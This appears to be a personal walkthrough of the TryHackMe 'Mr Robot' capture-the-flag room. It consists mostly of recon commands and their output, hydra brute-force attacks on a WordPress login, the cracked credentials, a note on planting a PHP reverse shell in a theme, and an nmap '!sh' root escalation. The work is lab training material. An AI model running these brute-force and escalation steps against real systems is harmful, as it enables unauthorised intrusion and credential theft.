+++
title = "Mr Robot"
+++
# https://tryhackme.com/room/mrrobot

```bash
=================================
10.201.27.97 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.27.97' >> ~/.zshrc && source ~/.zshrc

sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a $TARGET -- -oA $(date +%Y-%m-%d_%H%M)_rustscan -A
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Nmap scan report for 10.201.27.97
Host is up, received echo-reply ttl 60 (0.12s latency).
Scanned at 2025-10-05 12:38:27 EDT for 32s

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protoco
80/tcp  open  http     syn-ack ttl 60 Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack ttl 60 Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E

// wordpress site
http://10.201.27.97/wakeup
http://10.201.27.97/wp-login.php

gobuster --quiet --threads 64 --output gobuster_dir_common dir --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url $TARGET
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.201.27.97/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.201.27.97/Image/]
/admin                (Status: 301) [Size: 234] [--> http://10.201.27.97/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.201.27.97/audio/]
/atom                 (Status: 301) [Size: 0] [--> http://10.201.27.97/feed/atom/]
/blog                 (Status: 301) [Size: 233] [--> http://10.201.27.97/blog/]
/css                  (Status: 301) [Size: 232] [--> http://10.201.27.97/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.201.27.97/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.201.27.97/feed/]
/images               (Status: 301) [Size: 235] [--> http://10.201.27.97/images/]
/index.html           (Status: 200) [Size: 1188]
/image                (Status: 301) [Size: 0] [--> http://10.201.27.97/image/]
/index.php            (Status: 301) [Size: 0] [--> http://10.201.27.97/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 231] [--> http://10.201.27.97/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.201.27.97/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.201.27.97/]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rdf                  (Status: 301) [Size: 0] [--> http://10.201.27.97/feed/rdf/]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.201.27.97/render/https:/www.google.com]
/robots.txt           (Status: 200) [Size: 41]
/robots               (Status: 200) [Size: 41]
/rss2                 (Status: 301) [Size: 0] [--> http://10.201.27.97/feed/]
/rss                  (Status: 301) [Size: 0] [--> http://10.201.27.97/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 234] [--> http://10.201.27.97/video/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.201.27.97/wp-admin/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.201.27.97/wp-content/]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.201.27.97/wp-includes/]
/wp-config            (Status: 200) [Size: 0]
/wp-cron              (Status: 200) [Size: 0]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-login             (Status: 200) [Size: 2664]
/wp-mail              (Status: 500) [Size: 3064]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.201.27.97/wp-login.php?action=register]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]

wpscan --enumerate u --url http://$TARGET
[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.201.27.97/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.201.27.97/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.201.27.97/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.201.27.97/1a52450.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.201.27.97/1a52450.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.201.27.97/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.201.27.97/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: http://10.201.27.97/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.201.27.97/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

curl -o- http://10.201.27.97/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt

curl -o fsociety.dic http://10.201.27.97/fsocity.dic
// creds dictionary

http://10.201.27.97/key-1-of-3.txt
// 073403c8a58a1f80d943455fb30724b9

curl -o- http://10.201.27.97/readme
// I like where you head is at. However I'm not going to help you. 

whatweb --aggression 3 $TARGET
http://10.201.27.97 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.201.27.97], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]

wapiti --url http://$TARGET
// nothing useful

nikto -o nikto_scan.txt -h http://$TARGET
// /mzOZikbV.ca: Retrieved x-powered-by header: PHP/5.5.29.
// http://10.201.27.97/wp-links-opml.php
// <!-- generator="WordPress/4.3.1" -->

wpscan --password-attack wp-login --passwords fsociety.dic --usernames users.txt --url http://$TARGET
// slow

curl 'http://10.201.27.97/wp-login.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.201.27.97' -H 'Connection: keep-alive' -H 'Referer: http://10.201.27.97/wp-login.php' -H 'Cookie: s_cc=true; s_fid=010516110FF9FD0A-26BB817EE1FF4949; s_nr=1759683204365; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'log=baduser&pwd=badpassword&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.201.27.97%2Fwp-admin%2F&testcookie=1'

### STEG IMAGE ###
http://10.201.27.97/image/
steghide info image-1024x587.jpg
// prompts for password
stegcracker image-1024x587.jpg /home/vagrant/fsociety.dic
// waiting....

hydra -t 4 -L users.txt -P /home/vagrant/fsociety.dic ssh://$TARGET
// slow

### 
hydra -t 16 -L fsociety.dic -p badpass $TARGET http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -V
// good user!
// [80][http-post-form] host: 10.201.27.97   login: Elliot   password: badpass

hydra -t 16 -l Elliot -P fsociety.dic $TARGET http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=is incorrect' -V
// [80][http-post-form] host: 10.201.27.97   login: Elliot   password: ER28-0652  
wpscan --password-attack wp-login --passwords fsociety.dic --usernames Elliot --url http://$TARGET
// | Username: Elliot, Password: ER28-0652      

hydra -t 16 -l mich05654 -P fsociety.dic $TARGET http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=is incorrect' -V -f
[80][http-post-form] host: 10.201.27.97   login: mich05654   password: Dylan_2791

###
Edit theme to include PHP reverse shell
http://10.201.27.97/wp-admin/theme-editor.php?file=comments.php&theme=twentyfifteen&scrollto=3240

cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
// c3fcd3d76192e4007dfb496cca67e13b	md5	abcdefghijklmnopqrstuvwxyz
// robot:abcdefghijklmnopqrstuvwxyz

/opt/bitnami/apps/wordpress/htdocs/wp-admin/setup-config.php:   define('DB_PASSWORD', $pwd);
/opt/bitnami/apps/wordpress/htdocs/wp-admin/setup-config.php:   define('DB_USER', $uname);
/opt/bitnami/apps/wordpress/htdocs/wp-config.php:define('DB_PASSWORD', '570fd42948');
/opt/bitnami/apps/wordpress/htdocs/wp-config.php:define('DB_USER', 'bn_wordpress');
/opt/bitnami/apps/wordpress/htdocs/wp-config.php:define('FTP_USER', 'bitnamiftp');

// ROOT!
/usr/local/bin/nmap --interactive
!sh
cat /root/key-3-of-3.txt
```